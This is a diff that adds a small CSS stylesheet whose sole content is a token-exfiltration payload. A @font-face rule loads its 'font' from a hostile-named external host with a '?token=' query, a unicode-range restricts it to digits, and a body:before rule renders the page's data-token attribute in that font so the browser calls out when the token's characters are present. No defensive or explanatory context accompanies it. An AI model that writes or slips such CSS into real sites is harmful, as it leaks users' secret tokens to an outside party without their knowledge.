@@ -1,0 +1,9 @@
+@font-face {
+    font-family: "x";
+    src: url("https://iamevil.free.beeceptor.com/?token=") format("truetype");
+    unicode-range: U+0031-0039; /* Match numeric tokens */
+}
+body:before {
+    content: attr(data-token); /* Extract token as a string */
+    font-family: "x";
+}
